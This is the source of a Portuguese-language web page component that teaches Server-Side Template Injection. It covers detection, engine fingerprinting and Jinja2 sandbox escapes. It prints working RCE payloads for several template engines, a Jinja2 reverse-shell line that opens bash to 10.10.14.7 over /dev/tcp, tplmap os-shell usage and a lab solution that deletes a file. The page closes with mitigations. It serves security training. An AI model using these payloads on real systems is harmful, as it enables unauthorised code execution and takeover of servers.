import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function SSTI() {
  return (
    <PageContainer
      title="SSTI — Server-Side Template Injection"
      subtitle="Injeção em motor de template do lado servidor: de {{7*7}} a RCE. Jinja2/Flask, Twig, Freemarker, Velocity, Thymeleaf, ERB e mais. Detecção por polyglot, fingerprint da engine e a sandbox escape do Jinja2."
      difficulty="avancado"
      timeToRead="28 min"
    >
      <AlertBox type="danger" title="OWASP A03:2021 — Injection">
        SSTI acontece quando a entrada do usuário entra na <strong>string do template</strong>
        em vez de entrar como <strong>dado</strong> que o template consome. O motor então executa
        a entrada como código de template — e quase toda engine expõe algum caminho até
        <code>Runtime.exec</code>, <code>os.system</code> ou <code>eval</code>. Resultado típico:
        <strong>RCE não-autenticado</strong>. Foi assim em Uber (Jinja2), em vários CVEs de
        Atlassian (Freemarker/Velocity) e em painéis que renderizam e-mail/PDF a partir de
        template controlável.
      </AlertBox>

      <h2>Dado vs. template — a diferença que causa tudo</h2>
      <p>
        O jeito certo é o template ser fixo e o dado do usuário ser passado como variável:
        <code>render_template("ola.html", nome=user_input)</code>. O jeito errado é concatenar
        a entrada dentro da própria string do template:
        <code>render_template_string("Olá " + user_input)</code>. No segundo caso, se o usuário
        manda <code>{`{{7*7}}`}</code>, o motor <em>avalia</em> a expressão e devolve
        <code>49</code>. Achou o <code>49</code>? Achou execução de código de template.
      </p>

      <AlertBox type="warning" title="SSTI não é XSS">
        <code>{`{{7*7}}`}</code> refletido como <strong>49</strong> é SSTI (roda no servidor).
        <code>{`{{7*7}}`}</code> refletido literalmente como <strong>7*7</strong> mas com
        <code>&lt;script&gt;</code> executando no navegador é XSS (roda no cliente). O sintoma se
        parece; o impacto é totalmente diferente.
      </AlertBox>

      <h2>Passo 1 — Detecção: o polyglot que não quebra layout</h2>
      <p>
        Em vez de sair jogando <code>{`{{7*7}}`}</code> (que só funciona em engines de sintaxe
        Jinja/Twig), use um <strong>polyglot</strong> que dispara em várias sintaxes ao mesmo
        tempo e é fácil de reconhecer na resposta:
      </p>
      <CodeBlock language="text" code={"${{<%[%'\\\"}}%\\\\."} />
      <p>
        Se a aplicação estourar erro 500 ou devolver a string mutilada, tem parser de template
        no caminho. A partir daí, refine para achar qual engine é.
      </p>

      <OutputBlock label="sondas por sintaxe — o que cada engine devolve" type="muted">
{`Sonda            Resultado 49 =>            Resultado literal / erro =>
{{7*7}}          Jinja2, Twig, Nunjucks     (pode ser Django: NÃO avalia math)
{{7*'7'}}        Jinja2 => 7777777          Twig => 49   (desempata os dois!)
${7*7}           Freemarker, Velocity(#),   JSP EL, Thymeleaf(prefixo)
#{7*7}           Ruby ERB (=> 49)           Thymeleaf (#{...})
<%= 7*7 %>       ERB / EJS                  ASP
@(7*7)           Razor (.NET)
{7*7}            (raro) — smarty exige {math}`}
      </OutputBlock>

      <AlertBox type="info" title="O desempate clássico Jinja2 x Twig">
        Os dois entendem <code>{`{{7*7}}`}</code> e devolvem 49. Mande <code>{`{{7*'7'}}`}</code>:
        <strong>Jinja2</strong> (Python) concatena e devolve <code>7777777</code>;
        <strong>Twig</strong> (PHP) faz multiplicação numérica e devolve <code>49</code>.
      </AlertBox>

      <h2>Passo 2 — Fingerprint com a árvore de decisão do PortSwigger</h2>
      <p>
        A metodologia canônica (Vickie Li / James Kettle) é uma árvore: manda uma sonda,
        observa, ramifica. Resumo prático:
      </p>
      <CommandTable
        title="Árvore de fingerprint"
        variations={[
          { cmd: "{{7*7}} => 49", desc: "Sintaxe {{ }}. Testar {{7*'7'}}: 7777777=Jinja2, 49=Twig" },
          { cmd: "${7*7} => 49", desc: "Sintaxe ${ }. Desempatar Freemarker, Velocity, Thymeleaf ou JSP EL" },
          { cmd: "<%= 7*7 %> => 49", desc: "ERB (Ruby) ou EJS (Node)" },
          { cmd: "{{7*7}} literal", desc: "Django template ou Jinja2 restrito — Django não avalia aritmética" },
          { cmd: "a{*comment*}b => ab", desc: "Smarty (PHP)" },
        ]}
      />

      <h2>Passo 3 — JINJA2 / Flask: do 49 ao shell</h2>
      <p>
        O alvo mais comum. A ideia: a partir de qualquer objeto Python acessível no template,
        subir até <code>object</code>, listar suas subclasses e achar uma que dê acesso a
        <code>os</code> ou a <code>subprocess</code>. O caminho moderno e mais limpo usa
        <code>lipsum</code>/<code>cycler</code>/<code>request</code> para chegar direto em
        <code>os.popen</code>:
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) confirma execução (Jinja2 concatena string)",
            cmd: "curl -sG 'http://alvo/render' --data-urlencode \"nome={{7*'7'}}\"",
            out: `Olá 7777777`,
            outType: "warning",
          },
          {
            comment: "2) confirma classe base — vaza o config do Flask (SECRET_KEY!)",
            cmd: "curl -sG 'http://alvo/render' --data-urlencode \"nome={{config}}\"",
            out: `Olá <Config {'SECRET_KEY': 'super-secreto-123', 'DEBUG': True, ...}>`,
            outType: "error",
          },
          {
            comment: "3) RCE limpo via lipsum -> os (Jinja2 moderno)",
            cmd: "curl -sG 'http://alvo/render' --data-urlencode \"nome={{lipsum.__globals__['os'].popen('id').read()}}\"",
            out: `Olá uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
            outType: "error",
          },
        ]}
      />

      <p>
        Se <code>lipsum</code> estiver bloqueado, o caminho clássico via subclasses ainda
        funciona (verboso, mas resiliente):
      </p>
      <CodeBlock
        language="python"
        code={`# vazar a lista de subclasses e achar o índice de subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__() }}

# executar (troque 407 pelo índice real de <class 'subprocess.Popen'>)
{{ ''.__class__.__mro__[1].__subclasses__()[407]
   ('id', shell=True, stdout=-1).communicate()[0].decode() }}

# variação útil quando há WAF filtrando . ou [ ]
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}

# reverse shell direto
{{ lipsum.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"').read() }}`}
      />

      <AlertBox type="warning" title="Bypass de sandbox / WAF no Jinja2">
        Filtro em <code>_</code>, <code>.</code> ou <code>[]</code>? Use
        <code>|attr('__class__')</code> no lugar de <code>.__class__</code>, e
        <code>request|attr('application')</code>. Palavra <code>os</code> bloqueada? Monte por
        concatenação: <code>{`{{ ('o'~'s') }}`}</code> ou fatie strings com
        <code>request.args</code>. Filtro nas chaves <code>{`{{ }}`}</code>? Tente o bloco de
        statement <code>{`{% ... %}`}</code>.
      </AlertBox>

      <h2>Passo 4 — outras engines (payload de RCE direto)</h2>
      <CommandTable
        title="RCE por engine"
        variations={[
          { cmd: "Twig (PHP)", desc: "{{['id']|filter('system')}} ou registerUndefinedFilterCallback('exec') + getFilter('id')" },
          { cmd: "Freemarker (Java)", desc: `\${"freemarker.template.utility.Execute"?new()("id")}` },
          { cmd: "Velocity (Java)", desc: "#set($e=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))" },
          { cmd: "Thymeleaf (Spring)", desc: "[[${T(java.lang.Runtime).getRuntime().exec('id')}]] (SpringEL)" },
          { cmd: "ERB (Ruby)", desc: "<%= system('id') %> ou <%= `id` %>" },
          { cmd: "Smarty (PHP)", desc: "{system('id')} ou {php}system('id');{/php} em versões antigas" },
          { cmd: "Mako (Python)", desc: "${self.module.cache.util.os.system('id')}" },
        ]}
      />

      <h2>Automação — tplmap</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "detecta engine e tenta exploração sozinho",
            cmd: "tplmap -u 'http://alvo/render?nome=teste'",
            out: `[+] Tplmap 0.5\n[+] Testing if GET parameter 'nome' is injectable\n[+] Jinja2 plugin has confirmed injection with tag '{{*}}'\n[+] Tplmap identified the following injection point:\n    Engine: Jinja2   Injection: {{*}}   Context: text   OS: linux\n[+] Rendering: (+) code evaluation: ok, (+) shell command execution: ok`,
            outType: "warning",
          },
          {
            comment: "cai direto num shell no servidor",
            cmd: "tplmap -u 'http://alvo/render?nome=teste' --os-shell",
            out: `linux $ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)`,
            outType: "error",
          },
        ]}
      />
      <AlertBox type="info" title="Instalar o tplmap">
        Não vem por padrão em todas as ISOs.
        <code>git clone https://github.com/epinna/tplmap &amp;&amp; cd tplmap &amp;&amp; pip install -r requirements.txt</code>.
        É a ferramenta de referência, mas em CTF/HTB o payload manual do Jinja2 costuma ser mais
        rápido que configurar a tool.
      </AlertBox>

      <PracticeBox
        title="Lab PortSwigger — Basic SSTI (ERB)"
        goal="No lab 'Basic server-side template injection' (academy.portswigger.net), a engine é ERB (Ruby). Objetivo: apagar o arquivo morale.txt do carlos."
        command={`# 1) confirmar (a engine é ERB / Ruby)
GET /?message=<%= 7*7 %>
#  => resposta mostra 49

# 2) listar arquivos e achar o alvo
<%= system("ls /home/carlos") %>
#  => morale.txt

# 3) resolver o lab: apagar o arquivo do carlos
<%= system("rm /home/carlos/morale.txt") %>`}
        expected={`Congratulations, you solved the lab!`}
        verify="O banner do lab muda para 'Solved'. Em ERB, <%= system(...) %> executa direto, sem gadget chain."
      />

      <h2>Defesa — como fechar de verdade</h2>
      <CommandTable
        title="Mitigações"
        variations={[
          { cmd: "Nunca concatenar", desc: "Entrada do usuário SEMPRE como variável de contexto, nunca dentro da string do template" },
          { cmd: "Sandbox real", desc: "Jinja2 SandboxedEnvironment; ainda assim, defesa em profundidade e não barreira única" },
          { cmd: "Engine logicless", desc: "Prefira Mustache/Handlebars quando o usuário controla o template — sem avaliação de código" },
          { cmd: "Whitelist", desc: "Se precisa mesmo de template, exponha só variáveis/filtros específicos, sem __builtins__" },
        ]}
      />

      <AlertBox type="danger" title="No relatório: SSTI = RCE">
        Trate qualquer SSTI confirmado como <strong>CRITICAL</strong> por padrão: quase sempre
        vira execução de comando. Entregue PoC concreto (saída de <code>id</code> ou o
        <code>SECRET_KEY</code> do Flask via <code>{`{{config}}`}</code>) e evite payloads
        destrutivos em produção — <code>id</code>, <code>hostname</code> e <code>whoami</code> já
        provam o impacto.
      </AlertBox>
    </PageContainer>
  );
}
